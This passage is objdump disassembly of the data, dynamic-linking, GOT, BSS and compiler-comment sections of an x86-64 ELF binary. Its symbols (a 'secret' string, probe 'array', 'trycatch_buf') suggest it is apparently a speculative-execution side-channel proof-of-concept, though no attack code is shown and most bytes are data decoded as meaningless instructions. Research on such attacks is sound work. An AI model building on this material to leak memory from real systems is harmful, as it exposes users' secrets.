000000000000100c <__FRAME_END__>:
    100c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000201d80 <__frame_dummy_init_array_entry>:
  201d80:	70 08                	jo     201d8a <__init_array_end+0x2>
  201d82:	00 00                	add    %al,(%rax)
  201d84:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000201d88 <__do_global_dtors_aux_fini_array_entry>:
  201d88:	30 08                	xor    %cl,(%rax)
  201d8a:	00 00                	add    %al,(%rax)
  201d8c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000201d90 <_DYNAMIC>:
  201d90:	01 00                	add    %eax,(%rax)
  201d92:	00 00                	add    %al,(%rax)
  201d94:	00 00                	add    %al,(%rax)
  201d96:	00 00                	add    %al,(%rax)
  201d98:	01 00                	add    %eax,(%rax)
  201d9a:	00 00                	add    %al,(%rax)
  201d9c:	00 00                	add    %al,(%rax)
  201d9e:	00 00                	add    %al,(%rax)
  201da0:	0c 00                	or     $0x0,%al
  201da2:	00 00                	add    %al,(%rax)
  201da4:	00 00                	add    %al,(%rax)
  201da6:	00 00                	add    %al,(%rax)
  201da8:	b0 06                	mov    $0x6,%al
  201daa:	00 00                	add    %al,(%rax)
  201dac:	00 00                	add    %al,(%rax)
  201dae:	00 00                	add    %al,(%rax)
  201db0:	0d 00 00 00 00       	or     $0x0,%eax
  201db5:	00 00                	add    %al,(%rax)
  201db7:	00 74 0d 00          	add    %dh,0x0(%rbp,%rcx,1)
  201dbb:	00 00                	add    %al,(%rax)
  201dbd:	00 00                	add    %al,(%rax)
  201dbf:	00 19                	add    %bl,(%rcx)
  201dc1:	00 00                	add    %al,(%rax)
  201dc3:	00 00                	add    %al,(%rax)
  201dc5:	00 00                	add    %al,(%rax)
  201dc7:	00 80 1d 20 00 00    	add    %al,0x201d(%rax)
  201dcd:	00 00                	add    %al,(%rax)
  201dcf:	00 1b                	add    %bl,(%rbx)
  201dd1:	00 00                	add    %al,(%rax)
  201dd3:	00 00                	add    %al,(%rax)
  201dd5:	00 00                	add    %al,(%rax)
  201dd7:	00 08                	add    %cl,(%rax)
  201dd9:	00 00                	add    %al,(%rax)
  201ddb:	00 00                	add    %al,(%rax)
  201ddd:	00 00                	add    %al,(%rax)
  201ddf:	00 1a                	add    %bl,(%rdx)
  201de1:	00 00                	add    %al,(%rax)
  201de3:	00 00                	add    %al,(%rax)
  201de5:	00 00                	add    %al,(%rax)
  201de7:	00 88 1d 20 00 00    	add    %cl,0x201d(%rax)
  201ded:	00 00                	add    %al,(%rax)
  201def:	00 1c 00             	add    %bl,(%rax,%rax,1)
  201df2:	00 00                	add    %al,(%rax)
  201df4:	00 00                	add    %al,(%rax)
  201df6:	00 00                	add    %al,(%rax)
  201df8:	08 00                	or     %al,(%rax)
  201dfa:	00 00                	add    %al,(%rax)
  201dfc:	00 00                	add    %al,(%rax)
  201dfe:	00 00                	add    %al,(%rax)
  201e00:	f5                   	cmc    
  201e01:	fe                   	(bad)  
  201e02:	ff 6f 00             	ljmp   *0x0(%rdi)
  201e05:	00 00                	add    %al,(%rax)
  201e07:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  201e0d:	00 00                	add    %al,(%rax)
  201e0f:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201e15 <_DYNAMIC+0x85>
  201e15:	00 00                	add    %al,(%rax)
  201e17:	00 08                	add    %cl,(%rax)
  201e19:	04 00                	add    $0x0,%al
  201e1b:	00 00                	add    %al,(%rax)
  201e1d:	00 00                	add    %al,(%rax)
  201e1f:	00 06                	add    %al,(%rsi)
  201e21:	00 00                	add    %al,(%rax)
  201e23:	00 00                	add    %al,(%rax)
  201e25:	00 00                	add    %al,(%rax)
  201e27:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  201e2d:	00 00                	add    %al,(%rax)
  201e2f:	00 0a                	add    %cl,(%rdx)
  201e31:	00 00                	add    %al,(%rax)
  201e33:	00 00                	add    %al,(%rax)
  201e35:	00 00                	add    %al,(%rax)
  201e37:	00 d5                	add    %dl,%ch
  201e39:	00 00                	add    %al,(%rax)
  201e3b:	00 00                	add    %al,(%rax)
  201e3d:	00 00                	add    %al,(%rax)
  201e3f:	00 0b                	add    %cl,(%rbx)
  201e41:	00 00                	add    %al,(%rax)
  201e43:	00 00                	add    %al,(%rax)
  201e45:	00 00                	add    %al,(%rax)
  201e47:	00 18                	add    %bl,(%rax)
  201e49:	00 00                	add    %al,(%rax)
  201e4b:	00 00                	add    %al,(%rax)
  201e4d:	00 00                	add    %al,(%rax)
  201e4f:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 201e55 <_DYNAMIC+0xc5>
	...
  201e5d:	00 00                	add    %al,(%rax)
  201e5f:	00 03                	add    %al,(%rbx)
  201e61:	00 00                	add    %al,(%rax)
  201e63:	00 00                	add    %al,(%rax)
  201e65:	00 00                	add    %al,(%rax)
  201e67:	00 80 1f 20 00 00    	add    %al,0x201f(%rax)
  201e6d:	00 00                	add    %al,(%rax)
  201e6f:	00 02                	add    %al,(%rdx)
  201e71:	00 00                	add    %al,(%rax)
  201e73:	00 00                	add    %al,(%rax)
  201e75:	00 00                	add    %al,(%rax)
  201e77:	00 c0                	add    %al,%al
  201e79:	00 00                	add    %al,(%rax)
  201e7b:	00 00                	add    %al,(%rax)
  201e7d:	00 00                	add    %al,(%rax)
  201e7f:	00 14 00             	add    %dl,(%rax,%rax,1)
  201e82:	00 00                	add    %al,(%rax)
  201e84:	00 00                	add    %al,(%rax)
  201e86:	00 00                	add    %al,(%rax)
  201e88:	07                   	(bad)  
  201e89:	00 00                	add    %al,(%rax)
  201e8b:	00 00                	add    %al,(%rax)
  201e8d:	00 00                	add    %al,(%rax)
  201e8f:	00 17                	add    %dl,(%rdi)
  201e91:	00 00                	add    %al,(%rax)
  201e93:	00 00                	add    %al,(%rax)
  201e95:	00 00                	add    %al,(%rax)
  201e97:	00 f0                	add    %dh,%al
  201e99:	05 00 00 00 00       	add    $0x0,%eax
  201e9e:	00 00                	add    %al,(%rax)
  201ea0:	07                   	(bad)  
  201ea1:	00 00                	add    %al,(%rax)
  201ea3:	00 00                	add    %al,(%rax)
  201ea5:	00 00                	add    %al,(%rax)
  201ea7:	00 30                	add    %dh,(%rax)
  201ea9:	05 00 00 00 00       	add    $0x0,%eax
  201eae:	00 00                	add    %al,(%rax)
  201eb0:	08 00                	or     %al,(%rax)
  201eb2:	00 00                	add    %al,(%rax)
  201eb4:	00 00                	add    %al,(%rax)
  201eb6:	00 00                	add    %al,(%rax)
  201eb8:	c0 00 00             	rolb   $0x0,(%rax)
  201ebb:	00 00                	add    %al,(%rax)
  201ebd:	00 00                	add    %al,(%rax)
  201ebf:	00 09                	add    %cl,(%rcx)
  201ec1:	00 00                	add    %al,(%rax)
  201ec3:	00 00                	add    %al,(%rax)
  201ec5:	00 00                	add    %al,(%rax)
  201ec7:	00 18                	add    %bl,(%rax)
  201ec9:	00 00                	add    %al,(%rax)
  201ecb:	00 00                	add    %al,(%rax)
  201ecd:	00 00                	add    %al,(%rax)
  201ecf:	00 1e                	add    %bl,(%rsi)
  201ed1:	00 00                	add    %al,(%rax)
  201ed3:	00 00                	add    %al,(%rax)
  201ed5:	00 00                	add    %al,(%rax)
  201ed7:	00 08                	add    %cl,(%rax)
  201ed9:	00 00                	add    %al,(%rax)
  201edb:	00 00                	add    %al,(%rax)
  201edd:	00 00                	add    %al,(%rax)
  201edf:	00 fb                	add    %bh,%bl
  201ee1:	ff                   	(bad)  
  201ee2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ee5:	00 00                	add    %al,(%rax)
  201ee7:	00 01                	add    %al,(%rcx)
  201ee9:	00 00                	add    %al,(%rax)
  201eeb:	08 00                	or     %al,(%rax)
  201eed:	00 00                	add    %al,(%rax)
  201eef:	00 fe                	add    %bh,%dh
  201ef1:	ff                   	(bad)  
  201ef2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ef5:	00 00                	add    %al,(%rax)
  201ef7:	00 00                	add    %al,(%rax)
  201ef9:	05 00 00 00 00       	add    $0x0,%eax
  201efe:	00 00                	add    %al,(%rax)
  201f00:	ff                   	(bad)  
  201f01:	ff                   	(bad)  
  201f02:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f05:	00 00                	add    %al,(%rax)
  201f07:	00 01                	add    %al,(%rcx)
  201f09:	00 00                	add    %al,(%rax)
  201f0b:	00 00                	add    %al,(%rax)
  201f0d:	00 00                	add    %al,(%rax)
  201f0f:	00 f0                	add    %dh,%al
  201f11:	ff                   	(bad)  
  201f12:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f15:	00 00                	add    %al,(%rax)
  201f17:	00 de                	add    %bl,%dh
  201f19:	04 00                	add    $0x0,%al
  201f1b:	00 00                	add    %al,(%rax)
  201f1d:	00 00                	add    %al,(%rax)
  201f1f:	00 f9                	add    %bh,%cl
  201f21:	ff                   	(bad)  
  201f22:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f25:	00 00                	add    %al,(%rax)
  201f27:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000201f80 <_GLOBAL_OFFSET_TABLE_>:
  201f80:	90                   	nop
  201f81:	1d 20 00 00 00       	sbb    $0x20,%eax
	...
  201f96:	00 00                	add    %al,(%rax)
  201f98:	e6 06                	out    %al,$0x6
  201f9a:	00 00                	add    %al,(%rax)
  201f9c:	00 00                	add    %al,(%rax)
  201f9e:	00 00                	add    %al,(%rax)
  201fa0:	f6 06 00             	testb  $0x0,(%rsi)
  201fa3:	00 00                	add    %al,(%rax)
  201fa5:	00 00                	add    %al,(%rax)
  201fa7:	00 06                	add    %al,(%rsi)
  201fa9:	07                   	(bad)  
  201faa:	00 00                	add    %al,(%rax)
  201fac:	00 00                	add    %al,(%rax)
  201fae:	00 00                	add    %al,(%rax)
  201fb0:	16                   	(bad)  
  201fb1:	07                   	(bad)  
  201fb2:	00 00                	add    %al,(%rax)
  201fb4:	00 00                	add    %al,(%rax)
  201fb6:	00 00                	add    %al,(%rax)
  201fb8:	26 07                	es (bad) 
  201fba:	00 00                	add    %al,(%rax)
  201fbc:	00 00                	add    %al,(%rax)
  201fbe:	00 00                	add    %al,(%rax)
  201fc0:	36 07                	ss (bad) 
  201fc2:	00 00                	add    %al,(%rax)
  201fc4:	00 00                	add    %al,(%rax)
  201fc6:	00 00                	add    %al,(%rax)
  201fc8:	46 07                	rex.RX (bad) 
  201fca:	00 00                	add    %al,(%rax)
  201fcc:	00 00                	add    %al,(%rax)
  201fce:	00 00                	add    %al,(%rax)
  201fd0:	56                   	push   %rsi
  201fd1:	07                   	(bad)  
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     %ah,(%rax)
  20200a:	20 00                	and    %al,(%rax)
	...

0000000000202020 <bufferSize>:
  202020:	10 00                	adc    %al,(%rax)
	...

0000000000202024 <bufferSizeMask>:
  202024:	0f 00 00             	sldt   (%rax)
	...

0000000000202040 <buffer>:
  202040:	01 02                	add    %eax,(%rdx)
  202042:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
  202049:	0a 0b                	or     (%rbx),%cl
  20204b:	0c 0d                	or     $0xd,%al
  20204d:	0e                   	(bad)  
  20204e:	0f 10 00             	movups (%rax),%xmm0
	...

00000000002020e0 <secret>:
  2020e0:	54                   	push   %rsp
  2020e1:	68 65 20 4d 61       	pushq  $0x614d2065
  2020e6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  2020ed:	64 
  2020ee:	73 20                	jae    202110 <__TMC_END__>
  2020f0:	61                   	(bad)  
  2020f1:	72 65                	jb     202158 <temp+0x14>
  2020f3:	20 53 71             	and    %dl,0x71(%rbx)
  2020f6:	75 65                	jne    20215d <temp+0x19>
  2020f8:	61                   	(bad)  
  2020f9:	6d                   	insl   (%dx),%es:(%rdi)
  2020fa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  202101:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
	...

Disassembly of section .bss:

0000000000202120 <completed.7697>:
	...

0000000000202140 <try>:
  202140:	00 00                	add    %al,(%rax)
	...

0000000000202144 <temp>:
	...

0000000000202160 <trycatch_buf>:
	...

0000000000202240 <array>:
	...

0000000000302240 <unused3>:
	...

0000000000302280 <unused1>:
	...

00000000003022c0 <unused2>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x638>
   a:	74 75                	je     81 <_init-0x62f>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75325248>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x621>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
